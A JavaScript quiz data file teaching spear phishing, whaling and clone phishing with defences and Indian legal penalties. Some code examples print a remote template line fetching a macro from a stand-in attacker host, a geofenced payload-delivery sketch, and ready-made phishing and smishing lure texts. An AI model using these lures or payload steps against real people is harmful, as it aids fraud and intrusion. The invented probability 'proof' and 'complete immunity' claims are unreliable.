const questions = [
  {
    question: "What is the core distinction between Mass Phishing, Spear Phishing, and Whaling?",
    shortAnswer: "Mass Phishing sprays generic lures to millions; Spear Phishing targets specific individuals using customized OSINT context; Whaling specifically targets C-suite executives with high-value pretexts.",
    explanation: "Mass phishing relies on generic templates ('Dear Customer, verify your account'). Spear Phishing targets a specific engineer or accountant in Kolkata, referencing genuine colleagues, projects, and vendor names. Whaling is executive spear phishing targeting the 'big fish' (CEOs, CFOs, Board Members) with tailored legal subpoenas, board resolutions, or tax audit orders to seize high-level administrative credentials or authorize multimillion-rupee transfers.",
    hint: "Fishing with a giant net (Mass) vs harpooning a specific fish (Spear) vs hunting a massive whale (Whaling).",
    level: "basic",
    codeExample: `// Phishing vs Spear Phishing vs Whaling:
// Mass Phish   : "Dear User, your mailbox is full. Click here to clean."
// Spear Phish  : "Hi Mamata, regarding the Salt Lake switch migration project..."
// Whaling      : "CONFIDENTIAL SUBPOENA: Supreme Court of India vs [Enterprise CEO]"`
  },
  {
    question: "What is Clone Phishing, and how does it weaponize Legitimate Historical Email Communications?",
    shortAnswer: "The attacker captures a genuine previously delivered email, duplicates its exact body text and formatting, replaces the attachment or link with a malicious payload, and resends it claiming 'Updated document attached'.",
    explanation: "Clone Phishing achieves high trust because the victim already received and recognized the original conversation. The attacker modifies the legitimate email: replacing `Invoice_Q3.pdf` with `Invoice_Q3_Updated.pdf.exe` or altering the banking wire transfer details, sending it from a spoofed or lookalike domain with the subject line: `Resending: Updated Invoice with corrected banking details`.",
    hint: "Making a photocopy of a real bill, changing only the bank account number on the bottom, and mailing it back.",
    level: "expert",
    codeExample: `// Clone Phishing Workflow:
// Original Email  : From: "Authorized Vendor" <billing@vendor.in> | Attachment: "Contract.pdf"
// Cloned Email    : From: "Authorized Vendor" <billing@vend0r.in> | Attachment: "Contract_Updated.pdf.iso"
// Body Pretext    : "Please find the corrected contract with updated terms attached."`
  },
  {
    question: "How do Threat Actors use Open-Source Intelligence (OSINT) to craft Hyper-Personalized Spear-Phishing Lures?",
    shortAnswer: "By scraping LinkedIn for job titles/org charts, GitHub for internal tool names, conference rosters for travel dates, and ROC filings for vendor partnerships to build total contextual credibility.",
    explanation: "Attackers gather intelligence across multiple public sources: LinkedIn reveals that Mamata manages the Salt Lake switch migration; GitHub commits reveal internal server naming conventions; a conference tweet reveals the CEO is traveling to Delhi. The attacker constructs a spear-phishing lure that perfectly aligns with active real-world projects, eliminating suspicion.",
    hint: "Researching someone's favorite foods, daily schedule, and friends before knocking on their door pretending to be an old acquaintance.",
    level: "moderate",
    codeExample: `// OSINT Reconnaissance Data Points:
// Target      : Mamata (Lead Architect, Kolkata)
// Projects    : Salt Lake Gateway Migration 2026 (from LinkedIn)
// Vendor      : Cisco Systems India (from ROC Public Filings)
// Lure Crafted: "Cisco Gateway Firmware Update Patch for Salt Lake Node"`
  },
  {
    question: "What is Vendor Email Compromise (VEC) & Thread Hijacking in Spear Phishing?",
    shortAnswer: "An attacker compromises a legitimate third-party vendor's email account and injects malicious links or fraudulent banking details directly into an ongoing active email thread.",
    explanation: "Thread Hijacking bypasses all suspicion because the email arrives from a real, authenticated partner email account (`vendor@trusted-partner.com`) inside an existing conversation. The attacker replies to an ongoing thread: 'Mamata, we updated our bank account for the Kolkata grid contract—please remit the payment to our new Axis Bank account.' Because SPF, DKIM, and DMARC pass 100%, traditional filters fail.",
    hint: "An undercover thief who sneaks into the office, sits in the vendor's chair, and replies to the client's email right in the middle of a business conversation.",
    level: "expert",
    codeExample: `// Thread Hijacking / VEC Pattern:
// Ongoing Thread  : Re: Substation RTU Spare Parts Procurement
// Attacker Action : Injects reply from compromised vendor mailbox:
// "Hi Debangshu, please note our updated bank details for the Barrackpore delivery: Account #984210."`
  },
  {
    question: "How do Whaling Attacks leverage Legal, Regulatory, or M&A Pretexts to manipulate Corporate Executives?",
    shortAnswer: "By impersonating the Supreme Court, Tax Authorities, or M&A legal counsel, demanding immediate confidential review of legal filings to induce panic and secrecy.",
    explanation: "C-suite executives deal with sensitive corporate governance matters. A Whaling lure claims: 'CONFIDENTIAL: Notice of Contempt of Court - Supreme Court of India' or 'Strictly Confidential: Proposed Acquisition Agreement 2026.docx'. The executive is instructed not to discuss the document with colleagues for confidentiality reasons, isolating the victim from IT verification.",
    hint: "Delivering a forged letter bearing the royal seal marked 'For the King's Eyes Only - High Treason Investigation'.",
    level: "moderate",
    codeExample: `// Whaling Pretext Structure:
// Sender  : "Registrar - National Company Law Tribunal" <registrar@nclt-notice.in>
// Subject : "URGENT & CONFIDENTIAL: Summons for Corporate Director Hearing"
// Payload : "Download_Summons_Notice.pdf.exe" (Contains InfoStealer RAT!)`
  },
  {
    question: "Under the Indian Information Technology Act 2000 Section 66D, what constitutes the statutory offense of targeted spear phishing and personation?",
    shortAnswer: "Cheating by personating corporate executives or government officials over computer networks carries imprisonment up to 3 years and fines up to ₹1 Lakh.",
    explanation: "Section 66D explicitly penalizes targeted personation: 'Whoever, by means for any communication device or computer resource, cheats by personating, shall be punished with imprisonment of either description for a term which may extend to three years and shall also be liable to fine which may extend to one lakh rupees.'",
    hint: "Section 66D covers Cheating by Personation in spear phishing and whaling scams.",
    level: "basic",
    codeExample: `// Statutory Offense (IT Act Section 66D):
// Offense: Impersonating the Managing Director in targeted spear-phishing emails to steal credentials
// Penalty: Up to 3 Years Imprisonment + Fine up to ₹1,00,000`
  },
  {
    question: "What is a 'Cousin Domain' / Lookalike Domain in Targeted Spear Phishing?",
    shortAnswer: "A domain registered by attackers that closely resembles the target enterprise's domain (e.g. `kolkata-fintech-global.com` or `kolkatafintech.in` vs `kolkata-fintech.in`).",
    explanation: "In targeted spear phishing, attackers register lookalike cousin domains that differ only slightly from the victim's domain by adding keywords (`-support`, `-cloud`, `-portal`) or altering TLDs (`.co` instead of `.com`). Because the attacker owns the domain, they configure valid SPF, DKIM, and DMARC records, allowing the email to pass standard perimeter gateway checks.",
    hint: "Setting up a store named 'Kolkata Gold Jewellers International' right across the street from 'Kolkata Gold Jewellers'.",
    level: "moderate",
    codeExample: `// Cousin Domain Example:
// Legitimate Domain : kolkata-fintech.in
// Cousin Domain     : kolkata-fintech-cloud.in (Owns valid SPF & DKIM records!)`
  },
  {
    question: "How does VIP Mailbox Protection & Executive Priority Filtering defend C-Suite Accounts from Whaling?",
    shortAnswer: "Applying stricter AI behavioral inspection, dedicated sandboxing, aggressive domain impersonation rules, and mandatory Out-of-Band verification on all emails sent to or from executives.",
    explanation: "Executive mailboxes are high-value targets. VIP protection policies apply enhanced defenses: 1. Strict display name matching that quarantines any external email containing an executive's name; 2. In-depth sandbox detonation of all links and attachments; 3. Dedicated SOC alerts whenever a VIP clicks an external link; 4. Mandatory dual-authorization on all executive requests.",
    hint: "Providing a presidential motorcade with extra armored escort vehicles compared to ordinary city traffic.",
    level: "expert",
    codeExample: `// VIP Protection Policy Configuration (Exchange Online):
Set-AntiPhishPolicy -Identity "VIP_Executive_Armor" \`
    -TargetedUsersToProtect "ceo@kolkata-fintech.in", "cfo@kolkata-fintech.in" \`
    -TargetedUserProtectionAction Quarantine \`
    -EnableSimilarUsersSafetyTips $true \`
    -EnableUnusualCharactersSafetyTips $true`
  },
  {
    question: "Under the Digital Personal Data Protection (DPDP) Act 2023 Section 8(5) and Section 33, what are the enterprise liabilities if an executive falls for a Whaling attack leaking customer financial records?",
    shortAnswer: "Failure to implement organizational security safeguards (VIP mailbox protections and dual-authorization controls) triggers statutory penalties up to ₹250 Crores by the DPBI.",
    explanation: "Section 8(5) mandates reasonable security safeguards. If an enterprise in West Bengal fails to protect executive accounts, resulting in a Whaling compromise that exposes 500,000 citizen banking records, the DPBI can impose maximum statutory penalties up to ₹250 Crores under Section 33.",
    hint: "Failing to deploy executive protection safeguards triggers maximum penalties under national data privacy law.",
    level: "moderate",
    codeExample: `// DPDP Statutory Compliance Standard:
// Legal Section: Section 8(5) & Section 33 DPDP Act 2023
// Maximum Penalty: Up to ₹250,00,00,000 (Rupees 250 Crores) for negligent executive data protection`
  },
  {
    question: "What is Geofencing & Conditional Payload Delivery in Targeted Spear Phishing?",
    shortAnswer: "The attacker's C2 server checks the visitor's IP address and delivers the weaponized exploit only if the IP originates from the victim's specific organization or geographical region (e.g. Kolkata).",
    explanation: "To prevent external threat intelligence analysts from analyzing the malware, the attacker's staging server inspects the connecting IP. If an analyst in the US or an automated sandbox in Ireland requests the payload, the server returns a 404 error or a clean file. If the request originates from the target's IP block in Kolkata, the server delivers the weaponized zero-day exploit.",
    hint: "A secret package that can only be unlocked by someone holding a key stamped with a specific local city emblem.",
    level: "expert",
    codeExample: `// Geofenced Payload Delivery (PHP):
$client_ip = $_SERVER['REMOTE_ADDR'];
if (is_ip_in_kolkata_enterprise_range($client_ip)) {
    deliver_weaponized_payload(); // Targeted exploit delivered!
} else {
    header("HTTP/1.1 404 Not Found"); // Conceals exploit from security researchers!
}`
  },
  {
    question: "How does Out-of-Band (OOB) Dual-Authorization neutralize Clone Phishing Wire Transfer Fraud?",
    shortAnswer: "By requiring accounting staff to verbally verify any change in banking details or wire transfer requests via a pre-registered phone number before releasing funds.",
    explanation: "Clone Phishing often modifies bank account numbers on legitimate vendor invoices. In an Out-of-Band Dual-Authorization policy, whenever an invoice contains new or changed bank details, accounting policy strictly forbids processing until the clerk calls the vendor's financial officer on a pre-existing trusted phone number (never using the phone number printed on the invoice).",
    hint: "Calling your friend on their mobile phone to ask if they really sent the letter asking to borrow money.",
    level: "basic",
    codeExample: `// Out-of-Band Verification Policy:
// Trigger: Vendor Bank Account Details Changed in Email Invoice
// Mandate: Call vendor financial controller on registered master phone roster (NOT phone number in email!)`
  },
  {
    question: "What is 'Watercooler Phishing' / Department-Specific Spear Phishing?",
    shortAnswer: "Spear-phishing lures tailored to internal cultural inside jokes, office gossip, or specific department events (e.g. 'Photos from the Kolkata Office Annual Picnic').",
    explanation: "Attackers monitor employee social media posts to identify internal company social events. Following an annual company retreat or picnic in Kolkata, the attacker emails the department: 'Here is the link to download the high-res photos from Friday's office picnic.zip'. The shared social context lowers defenses, driving click-through rates above 60%.",
    hint: "Bringing up a private inside joke to prove you belong to the inner circle.",
    level: "moderate",
    codeExample: `// Watercooler Spear-Phishing Lure:
// Subject: "Photos from Kolkata Sector V Team Outing & Dinner!"
// Payload: "Kolkata_Team_Photos.zip" (Contains LNK file executing hidden PowerShell!)`
  },
  {
    question: "Under CERT-In Mandatory Directions 2022, what is the mandatory incident reporting timeline for targeted spear-phishing compromises affecting critical infrastructure?",
    shortAnswer: "All organizations in India must report spear-phishing breaches and unauthorized administrative access to CERT-In within 6 HOURS of detection.",
    explanation: "Under Section 70B of the IT Act and CERT-In Direction No. 20(3)/2022-CERT-In, service providers, intermediaries, data centers, and corporate bodies must mandatorily report specified cyber security incidents to CERT-In within 6 hours of noticing them.",
    hint: "CERT-In requires mandatory incident reporting within a strict 6-hour window.",
    level: "basic",
    codeExample: `// Statutory SLA (CERT-In Mandatory Incident Reporting):
// Directive: Mandatory reporting of all spear-phishing compromises within 6 HOURS
// Mandate: Section 70B Information Technology Act 2000`
  },
  {
    question: "How does Remote Template Injection in Weaponized Word Documents execute Targeted Spear-Phishing Attacks?",
    shortAnswer: "The attached DOCX file contains no malicious code initially; when opened, it fetches a malicious Word macro template (`.dotm`) from an external attacker C2 server.",
    explanation: "Perimeter antivirus scanners analyze static attachments. In Remote Template Injection, the `.docx` file contains an internal relationship XML file (`word/_rels/settings.xml.rels`) pointing to an external URL: `Target='https://attacker-c2.net/template.dotm'`. The clean document passes all email gateway scanners. When the victim opens the document in Microsoft Word, Word dynamically downloads and executes the macro template from the C2 server.",
    hint: "Sending a blank picture frame that downloads the secret picture from the internet only when hung on the wall.",
    level: "expert",
    codeExample: `<!-- word/_rels/settings.xml.rels (Remote Template Injection) -->
<Relationship Id="rId1" 
  Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" 
  Target="https://attacker-c2.net/malicious_template.dotm" 
  TargetMode="External" />`
  },
  {
    question: "What is 'Angler Phishing' / Social Media Customer Service Hijacking?",
    shortAnswer: "Attackers monitor corporate Twitter/LinkedIn feeds for customer complaints; when a user tweets a complaint, the attacker immediately responds using a fake support handle to steal credentials.",
    explanation: "When a customer tweets: 'My NetBanking app is locked!', attackers running automated bots intercept the tweet within seconds. The bot responds from `@ICICI_HelpDesk_Care`: 'We are sorry! Please DM your account number and click here to unlock: `http://icici-verify.in`'. Because the customer is actively seeking help, trust is immediate.",
    hint: "A fake mechanic who listens for people shouting about car troubles on the street and rushes over offering help.",
    level: "moderate",
    codeExample: `// Angler Phishing Social Bot:
// Customer Tweet: "@KolkataFinTech payment failed on order #94821!"
// Bot Response   : "Hello! Our support team is here to assist. Click https://kolkata-fintech-help.in to refund."`
  },
  {
    question: "Under the Indian IT Act Section 43(a), what constitutes civil liability for unauthorized access resulting from targeted spear phishing?",
    shortAnswer: "Liable to pay compensation by way of damages not exceeding ₹1 Crore to the affected entity for gaining unauthorized access via spear phishing deception.",
    explanation: "Section 43(a) explicitly penalizes unauthorized access: 'If any person without permission of the owner... accesses or secures access to such computer... he shall be liable to pay damages by way of compensation not exceeding one crore rupees.'",
    hint: "Section 43(a) provides civil compensation up to ₹1 Crore for unauthorized system access.",
    level: "basic",
    codeExample: `// Statutory Liability (IT Act Section 43(a)):
// Violation: Accessing corporate financial networks via targeted spear phishing
// Compensation: Up to ₹1,00,00,00,000 (Rupees One Crore) per affected entity`
  },
  {
    question: "What is 'Thread Continuation Pretexting' in Clone Phishing?",
    shortAnswer: "Adding a plausible forward or reply header to a cloned email (e.g. 'FYI: Per our discussion earlier') to make the recipient believe the email is part of an ongoing approved workflow.",
    explanation: "Even if an attacker cannot compromise a vendor account, they inject fabricated forward headers into a cloned email: `-----Original Message----- From: Managing Director Sent: Today 9:00 AM Subject: Approved Invoice`. The victim believes their direct manager has already reviewed and approved the attachment, disarming their normal scrutiny.",
    hint: "Stamping 'Approved by Management' on a forged request form before handing it to the clerk.",
    level: "moderate",
    codeExample: `// Fabricated Forward Header in Phishing Body:
-----Original Message-----
From: "Mamata (Lead Architect)" <mamata@kolkata-fintech.in>
To: "Debangshu (Operations)" <debangshu@kolkata-fintech.in>
Subject: FW: Approved Vendor Invoice - Please Process Immediately`
  },
  {
    question: "Synthesize an enterprise-scale Targeted Phishing & Whaling Defense Architecture.",
    shortAnswer: "A multi-layered defense combining VIP Executive Mailbox Protection, DMARC `p=reject` Enforcement, Out-of-Band Dual-Authorization, FIDO2 Passwordless Passkeys, and Dynamic Remote Template Blocking.",
    explanation: "To achieve complete immunity against targeted spear phishing, whaling, and clone phishing: 1. Executive Tier: VIP mailbox protection with automated display name quarantine and strict similarity alerts. 2. Gateway Tier: DMARC `p=reject`, SPF, and DKIM enforcement. 3. Process Tier: Mandatory Out-of-Band voice verification for all financial transfers and banking detail changes. 4. Application Tier: Attack Surface Reduction (ASR) rules blocking Word from downloading external templates. 5. Identity Tier: FIDO2 WebAuthn passkeys immune to credential harvesting.",
    hint: "Deploy VIP mailbox isolation, DMARC p=reject, out-of-band voice confirmation, ASR template blocking, and FIDO2 passkeys.",
    level: "expert",
    codeExample: `// Master Targeted Phishing Defense Blueprint:
// 1. VIP Armor Layer    : Executive display name quarantine & priority sandbox detonation
// 2. Identity Layer     : FIDO2 WebAuthn Passkeys (Origin binding mathematically stops credential theft)
// 3. Process Layer      : Out-of-Band voice call verification for wire transfers > ₹1,00,000
// 4. Host Hardening     : Microsoft Defender ASR rule blocking Office child processes & remote templates
// 5. Gateway Layer      : DMARC p=reject + Lookalike Domain DNS Intelligence Monitoring`
  },
  {
    question: "How do Attack Surface Reduction (ASR) Rules in Windows Defender block Remote Template Injection in Spear Phishing?",
    shortAnswer: "By enforcing kernel-level rules that prohibit Microsoft Office applications from creating child processes or downloading external macro templates.",
    explanation: "Microsoft Defender ASR rules block attack vectors before execution. Rule `D4F940AB-401B-4EFC-AADC-AD5F3C50688A` ('Block all Office applications from creating child processes') and Rule `3B576487-A4EC-4D0E-B3E6-1AF99AEE3FEF` ('Block Office from injecting code into other processes') ensure that even if a victim opens a weaponized document, the operating system blocks the download and execution of the remote template.",
    hint: "A lock on the office cabinet that prevents Word documents from calling out to external delivery drivers.",
    level: "expert",
    codeExample: `# PowerShell Command to Enable ASR Remote Template & Child Process Blocking:
Add-MpPreference -AttackSurfaceReductionRules_Ids D4F940AB-401B-4EFC-AADC-AD5F3C50688A -AttackSurfaceReductionRules_Actions Enabled
Write-Host "[+] ASR Rule ACTIVE: Office child process creation blocked!" -ForegroundColor Green`
  },
  {
    question: "What is Executive Impersonation via Lookalike WhatsApp & Telegram Profiles in Mobile Spear Phishing?",
    shortAnswer: "Attackers create WhatsApp/Telegram accounts using the CEO's public photo and name, messaging subordinates: 'I am in a meeting with bad reception, buy ₹50,000 in Google Play gift cards for our clients'.",
    explanation: "Executives frequently communicate with teams via mobile messaging apps. Attackers download the CEO's photo from LinkedIn, create a WhatsApp profile, and message junior employees: 'Hi Mamata, I am in an urgent client meeting in Salt Lake and need you to purchase 5 Apple gift vouchers for the client immediately'. The informal mobile channel bypasses corporate email gateway defenses.",
    hint: "Sending a text message with the boss's face as the profile picture asking for gift cards.",
    level: "moderate",
    codeExample: `// Mobile Executive Spear-Phishing Script:
// WhatsApp Profile : Photo of Enterprise CEO | Display Name: "Managing Director"
// Message          : "Mamata, I am stuck in a board meeting in Kolkata. Please purchase ₹50,000 in gift vouchers for the delegates and send the codes here."`
  },
  {
    question: "Under the Indian IT Act Section 66, what constitutes the criminal penalty for executing spear-phishing operations?",
    shortAnswer: "Dishonestly or fraudulently accessing computer systems via spear phishing carries imprisonment up to 3 years and fines up to ₹5 Lakhs.",
    explanation: "Section 66 criminalizes unauthorized computer access: 'If any person, dishonestly or fraudulently, does any act referred to in section 43... he shall be punishable with imprisonment for a term which may extend to three years or with fine which may extend to five lakh rupees, or with both.'",
    hint: "Section 66 provides up to 3 years imprisonment and ₹5 Lakh fine for spear phishing.",
    level: "basic",
    codeExample: `// Statutory Penalty (IT Act Section 66):
// Offense: Using spear-phishing intelligence to compromise enterprise servers
// Penalty: Up to 3 Years Imprisonment + Fine up to ₹5,00,000`
  },
  {
    question: "What is 'Smishing' in Targeted Executive Phishing (Executive Smishing)?",
    shortAnswer: "Sending targeted SMS text messages to corporate executives spoofing state tax boards or banks, prompting them to click an urgent link on their unmanaged smartphones.",
    explanation: "Executive Smishing targets C-suite mobile phones. The SMS reads: 'Income Tax Department (Kolkata): Immediate discrepancy detected in Q3 corporate tax filing. Review notice: `https://it-tax-notice.in/ref492`'. Because smartphones lack enterprise web proxies, the executive opens the link and enters their credentials into a mobile-optimized credential harvester.",
    hint: "A fraudulent text message sent to the CEO's personal mobile phone.",
    level: "basic",
    codeExample: `// Executive Smishing SMS:
// Sender : "IT-DEPT-GOV"
// Text   : "URGENT: Corporate Tax Audit Notice issued for [Company Name]. Review filing before 5 PM: https://incometax-notice-portal.in"`
  },
  {
    question: "How does Lookalike Domain Monitoring & Takedown Services neutralize Spear-Phishing Infrastructure before Attacks Launch?",
    shortAnswer: "By continuously scanning newly registered domains (NRDs) and Certificate Transparency logs for brand name permutations, issuing automated takedown notices and DNS blocks before emails are sent.",
    explanation: "Before launching a spear-phishing campaign, attackers register lookalike domains (`kolkata-fintech-support.in`). Automated brand monitoring tools ingest global Certificate Transparency (CT) logs and WHOIS feeds in real time. The moment a domain containing 'kolkata-fintech' is registered, security teams submit automated abuse takedowns to the registrar and push DNS sinkhole blocks to corporate firewalls within minutes.",
    hint: "Patrolling the trademark registry to spot counterfeiters registering your brand name before they start manufacturing fake goods.",
    level: "expert",
    codeExample: `# Python Certificate Transparency Stream Monitor:
import certstream

def print_callback(message, context):
    if message['message_type'] == "certificate_update":
        all_domains = message['data']['leaf_cert']['all_domains']
        for domain in all_domains:
            if "kolkata-fintech" in domain and not domain.endswith("kolkata-fintech.in"):
                print(f"[!] ALERT: Suspicious Lookalike Domain Detected: {domain}")

certstream.listen_for_events(print_callback)`
  },
  {
    question: "Under the Indian Penal Code Section 420, what constitutes Cheating and Dishonestly Inducing Delivery of Property via Whaling and Clone Phishing?",
    shortAnswer: "Deceiving an enterprise employee through spoofed executive communications to dishonestly induce them to transfer corporate funds or confidential intellectual property, punishable with imprisonment up to 7 years.",
    explanation: "Section 420 IPC penalizes cheating: 'Whoever cheats and thereby dishonestly induces the person deceived to deliver any property... shall be punished with imprisonment of either description for a term which may extend to seven years, and shall also be liable to fine.' Whaling scams targeting corporate treasuries are prosecuted under Section 420 alongside IT Act Section 66D.",
    hint: "IPC Section 420 covers Cheating and Fraudulent Inducement for whaling scams.",
    level: "basic",
    codeExample: `// Statutory Offense (Indian Penal Code Section 420):
// Offense: Deceiving accounting staff via spoofed executive emails to transfer ₹3.8 Crores
// Penalty: Imprisonment for a term up to 7 Years, and shall also be liable to Fine`
  },
  {
    question: "What is 'Reverse Whaling' / Impersonating Lower-Level Technicians to Target Executives?",
    shortAnswer: "The attacker impersonates a humble internal IT technician or helpdesk clerk, asking the executive to approve an urgent technical ticket or verify a password reset.",
    explanation: "While traditional Whaling attacks executives by posing as higher authorities, Reverse Whaling poses as a polite, overwhelmed internal technician: 'Hello Sir, this is Sandeep from Kolkata IT Desk. We are migrating the executive email server—could you please confirm this test login prompt?'. Executives often approve out of a desire to resolve the technician's request quickly.",
    hint: "A janitor politely asking the mansion owner to unlock the back door so they can finish cleaning.",
    level: "expert",
    codeExample: `// Reverse Whaling Pretext:
// Sender  : "Internal IT Helpdesk" <support@internal-it-desk.in>
// Body    : "Dear CEO, we are upgrading executive mailbox storage quotas. Please confirm this one-time approval link."`
  },
  {
    question: "How do Passwordless FIDO2 WebAuthn Passkeys neutralize Whaling and Spear-Phishing Credential Theft?",
    shortAnswer: "FIDO2 passkeys use cryptographic origin binding; the hardware key mathematically signs authentication requests only for the exact legitimate domain, refusing to sign for lookalike or spoofed domains.",
    explanation: "Even if an executive falls for a hyper-personalized Whaling lure and navigates to `https://login.microsoft.com.attacker-domain.in`, the browser queries the FIDO2 hardware token with the origin `attacker-domain.in`. The passkey checks its internal cryptographic credentials, discovers no matching key pair for `attacker-domain.in`, and refuses to sign the authentication request. Zero credentials are submitted.",
    hint: "A key that physically alters its shape so it only turns inside the genuine lock, refusing to fit into a counterfeit lock.",
    level: "expert",
    codeExample: `// FIDO2 Passkey Mathematical Origin Binding:
// Target Domain   : kolkata-fintech.in (Has Registered Passkey Private Key)
// Phishing Portal : kolkata-fintech.attacker-host.net
// Result          : WebAuthn API Error: Origin mismatch! Private key refuses to sign! (0% Credential Leak)`
  },
  {
    question: "What is 'Callback Phishing' / Telephone-Oriented Attack Delivery (TOAD) in Targeted Phishing?",
    shortAnswer: "The email contains no malicious links or attachments; it displays a fake invoice notice instructing the victim to call a telephone helpline, where a live attacker guides them to install a Remote Access Trojan (RAT).",
    explanation: "Because the email contains zero URLs and zero attachments, Secure Email Gateways rate the email as 100% clean. The email reads: 'Geek Squad / Norton: ₹34,999 charged to your card. If unauthorized, call 033-2592-XXXX immediately.' When the panicked victim calls the number, the attacker poses as support and instructs them to download AnyDesk or TeamViewer to 'process a refund', seizing control of the computer.",
    hint: "A letter containing only a telephone number that connects you directly to a fraudster.",
    level: "moderate",
    codeExample: `// TOAD / Callback Phishing Flow:
// [Clean Email: "Invoice of ₹34,999 Charged - Call 033-2592-XXXX to Cancel"]
// ➔ [Victim Calls Helpline] ➔ [Attacker guides victim to install AnyDesk/RAT]`
  },
  {
    question: "How does Dynamic Lookalike Domain Homoglyph Generation use Unicode Script Mixing in Spear Phishing?",
    shortAnswer: "By mixing Latin and Cyrillic/Greek characters that appear visually identical on screen (e.g. replacing Latin 'o' with Cyrillic 'о'), creating indistinguishable spoofed domains.",
    explanation: "Internationalized Domain Names (IDN) permit Unicode characters. Attackers register `kоlkata-fintech.in` where the first 'o' is Cyrillic `U+043E`. In browsers and email clients, the Cyrillic 'o' renders identically to the Latin 'o'. Only technical Punycode conversion (`xn--klkata-fintech-hpl.in`) reveals the domain spoofing.",
    hint: "A counterfeit coin made of identical metal with a microscopic hidden mint mark.",
    level: "expert",
    codeExample: `// Homoglyph Domain Comparison:
// Genuine Domain : kolkata-fintech.in (Latin 'o' U+006F)
// Spoofed Domain : kоlkata-fintech.in (Cyrillic 'о' U+043E ➔ Punycode: xn--klkata-fintech-hpl.in)`
  },
  {
    question: "Synthesize the mathematical relationship between Target Context Specificity (C_context), Target Seniority Factor (T_target), Defensive Armor Strength (R_armor), and Targeted Phishing Exploitation Probability (P_exploit).",
    shortAnswer: "Targeted exploitation probability is modeled as P_exploit = 1 - e^(- (C_context * T_target) / R_armor); high context and executive seniority drive P_exploit to 1.0, but enforcing high defensive armor (FIDO2 passkeys and Out-of-Band verification) reduces exploitation probability to zero.",
    explanation: "Let $C_{\\text{context}} \\ge 1.0$ represent the depth of OSINT contextual personalization, $T_{\\text{target}} \\ge 1.0$ represent the seniority/authority multiplier of the target (C-suite executive = 4.0), and $R_{\\text{armor}}$ represent the defensive armor strength (VIP mailbox filtering, Out-of-Band verification, FIDO2 passkeys). The exploitation probability is: $P_{\\text{exploit}} = 1 - e^{-\\frac{C_{\\text{context}} \\times T_{\\text{target}}}{R_{\\text{armor}}}}$. When organizations enforce strict Out-of-Band dual authorization and FIDO2 passkeys ($R_{\\text{armor}} \\to \\infty$), targeted breach probability collapses to zero regardless of how high-context or senior the target is.",
    hint: "Mathematical formula proving that strong defensive armor (FIDO2 + Out-of-Band) neutralizes targeted OSINT context and executive seniority.",
    level: "expert",
    codeExample: `// Targeted Exploitation Mathematical Proof:
// C_context = 4.5 (Deep OSINT Research) | T_target = 4.0 (Enterprise CEO / Whaling)
// Without Armor (R_armor = 1.0) ➔ P_exploit = 1 - e^(-18.0) = 100.0% (BREACHED!)
// With FIDO2 + OOB Armor (R_armor = 1000) ➔ P_exploit = 1 - e^(-0.018) = 1.78% (SECURED!)`
  }
];

export default questions;
